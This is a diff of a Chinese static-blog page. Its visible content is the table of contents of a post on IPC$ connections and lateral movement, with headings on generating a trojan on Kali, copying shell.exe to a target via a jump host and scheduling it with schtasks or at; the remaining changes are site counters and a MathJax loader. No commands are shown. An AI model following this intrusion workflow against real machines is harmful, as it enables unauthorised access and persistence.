class="nav-number">1.3.</span> <span class="nav-text">确定主机时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E5%85%B3%E9%97%ADipc%E5%85%B1%E4%BA%AB"><span class="nav-number">1.4.</span> <span class="nav-text">开启&#x2F;关闭IPC$共享</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E7%A9%BA%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text">建立空连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8B%E5%AE%8C%E6%95%B4%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D-%E5%AF%86%E7%A0%81ipc%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.4.2.</span> <span class="nav-text">建立完整的用户名 密码IPC$连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4ipc%E8%BF%9E%E6%8E%A5"><span class="nav-number">1.4.3.</span> <span class="nav-text">删除IPC$连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%98%A0%E5%B0%84"><span class="nav-number">1.4.4.</span> <span class="nav-text">路径映射</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E6%98%A0%E5%B0%84%E7%9A%84z%E7%9B%98"><span class="nav-number">1.4.5.</span> <span class="nav-text">删除映射的z盘</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A0%E9%99%A4%E5%85%A8%E9%83%A8"><span class="nav-number">1.4.6.</span> <span class="nav-text">删除全部</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8dir%E6%9F%A5%E7%9C%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E7%9B%AE%E5%BD%95"><span class="nav-number">1.4.7.</span> <span class="nav-text">使用dir查看目标机器目录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%8D%E5%88%B6%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.8.</span> <span class="nav-text">复制文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.9.</span> <span class="nav-text">下载文件</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8at%E5%91%BD%E4%BB%A4%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">1.5.</span> <span class="nav-text">使用at命令创建计划任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8type%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="nav-number">1.6.</span> <span class="nav-text">使用type读取文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%9E%E4%BE%8B1"><span class="nav-number">1.7.</span> <span class="nav-text">实例1</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ipc%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">IPC+计划任务进行横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8schtasks%E5%91%BD%E4%BB%A4"><span class="nav-number">2.1.</span> <span class="nav-text">使用schtasks命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%B7%B3%E6%9D%BF%E6%9C%BA%E4%B8%8E%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%BB%BA%E7%AB%8Bipc%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.1.1.</span> <span class="nav-text">跳板机与目标机建立IPC连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#kali%E4%B8%8A%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="nav-number">2.1.2.</span> <span class="nav-text">kali上生成木马</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%86shell.exe%E4%BC%A0%E5%88%B0%E8%B7%B3%E8%BD%AC%E6%9C%BA%E4%B8%8A"><span class="nav-number">2.2.</span> <span class="nav-text">将shell.exe传到跳转机上</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E8%B7%B3%E8%BD%AC%E6%9C%BA%E4%B8%8A%E4%BD%BF%E7%94%A8copy%E5%91%BD%E4%BB%A4%E5%B0%86shell.exe%E5%A4%8D%E5%88%B6%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA"><span class="nav-number">2.2.1.</span> <span class="nav-text">在跳转机上使用copy命令将shell.exe复制到目标机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8schtasks%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%90%8D%E4%B8%BAshell%E7%9A%84%E8%AE%A1%E5%88%92%E5%91%BD%E4%BB%A4%E8%AF%A5%E5%91%BD%E4%BB%A4%E6%AF%8F%E5%88%86%E9%92%9F%E6%89%A7%E8%A1%8C%E4%B8%80%E6%AC%A1shell.exe"><span class="nav-number">2.2.2.</span> <span class="nav-text">利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8schtasks-%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8type%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9"><span class="nav-number">2.2.3.</span> <span class="nav-text">利用schtasks
+执行命令，使用type读取文件内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#schtasks-%E5%88%A0%E9%99%A4%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="nav-number">2.2.4.</span> <span class="nav-text">schtasks 删除计划任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%96%AD%E5%BC%80ipc%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.2.5.</span> <span class="nav-text">断开ipc$连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#schtasks-%E5%8F%82%E6%95%B0"><span class="nav-number">2.2.6.</span> <span class="nav-text">schtasks 参数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8at%E5%91%BD%E4%BB%A4"><span class="nav-number">2.3.</span> <span class="nav-text">使用at命令</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%8E%E5%BB%BA%E7%AB%8B%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E5%BB%BA%E7%AB%8Bipc%E8%BF%9E%E6%8E%A5"><span class="nav-number">2.3.1.</span> <span class="nav-text">与建立目标机器建立IPC连接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%9C%A8%E8%B7%B3%E8%BD%AC%E6%9C%BA%E4%B8%8A%E4%BD%BF%E7%94%A8copy%E5%91%BD%E4%BB%A4%E5%B0%86shell2.exe%E5%A4%8D%E5%88%B6%E5%88%B0%E7%9B%AE%E6%A0%87%E6%9C%BA"><span class="nav-number">2.3.2.</span> <span class="nav-text">在跳转机上使用copy命令将shell2.exe复制到目标机</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8at%E5%91%BD%E4%BB%A4%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1-1"><span class="nav-number">2.3.3.</span> <span class="nav-text">使用at命令创建计划任务</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8"><span class="nav-number">2.3.4.</span> <span class="nav-text">查看任务列表</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">3.</span> <span class="nav-text">Reference</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -576,7 +613,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -624,7 +661,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -638,7 +675,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -649,7 +686,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -789,6 +826,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
